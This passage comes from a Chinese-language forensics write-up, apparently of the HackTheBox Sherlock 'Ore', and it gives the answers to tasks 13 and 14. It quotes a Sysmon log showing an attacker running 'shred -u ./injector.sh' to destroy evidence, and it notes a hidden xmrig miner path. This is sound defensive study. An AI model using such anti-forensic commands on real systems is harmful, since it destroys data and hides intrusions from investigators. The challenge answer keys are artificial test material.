<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">ip-172-31-13-147-20221124-1501-process-exe-links.txt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">lrwxrwxrwx 1 root             root             0 Nov 24 14:46 /proc/1089/exe -&gt; /usr/share/.logstxt/xmrig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/share/.logstxt/xmrig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="#task-13" class="hash-link" aria-label="Task 13的直接链接" title="Task 13的直接链接">​</a></h2>
<blockquote>
<p>我们无法进行取证地恢复用于分析的 “injector.sh” 脚本。我们认为 TA 可能运行了一个命令，阻止我们恢复该文件。TA 运行了哪个命令？</p>
</blockquote>
<p>继续查看 <code>syslog</code></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:49.343163000Z&quot;/&gt;&lt;EventRecordID&gt;77196&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:49.344&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4095-637f-505f-8d8aca550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4091&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/shred&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;shred -u ./injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-4884-6c9bed550000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4004&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">shred -u ./injector.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-14">Task 14<a href="#task-14" class="hash-link" aria-label="Task 14的直接链接" title="Task 14的直接链接">​</a></h2>
<blockquote>
<p>由我们的 IT 管理员创建的 cronjob 为 TA 修改的脚本运行多频繁？</p>
</blockquote>
<p>分析 <code>syslog</code> 日志文件，定位每天的固定时间的相同记录即可</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">daily - 08:30</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Sherlocks/Ore/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/OpTinselTrace-2/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">OpTinselTrace-2</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Recollection/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Recollection</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#题目数据" class="table-of-contents__link toc-highlight">题目数据</a></li><li><a href="#题目附件讲解" class="table-of-contents__link toc-highlight">题目附件讲解</a></li><li><a href="#task-1" class="table-of-contents__link toc-highlight">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link toc-highlight">Task 2</a></li><li><a href="#task-3" class="table-of-contents__link toc-highlight">Task 3</a></li><li><a href="#task-4" class="table-of-contents__link toc-highlight">Task 4</a></li><li><a href="#task-5" class="table-of-contents__link toc-highlight">Task 5</a></li><li><a href="#task-6" class="table-of-contents__link toc-highlight">Task 6</a></li><li><a href="#task-7" class="table-of-contents__link toc-highlight">Task 7</a></li><li><a href="#task-8" class="table-of-contents__link toc-highlight">Task 8</a></li><li><a href="#task-9" class="table-of-contents__link toc-highlight">Task 9</a></li><li><a href="#task-10" class="table-of-contents__link toc-highlight">Task 10</a></li><li><a href="#task-11" class="table-of-contents__link toc-highlight">Task 11</a></li><li><a href="#task-12" class="table-of-contents__link toc-highlight">Task 12</a></li><li><a href="#task-13" class="table-of-contents__link toc-highlight">Task 13</a></li><li><a href="#task-14" class="table-of-contents__link toc-highlight">Task 14</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>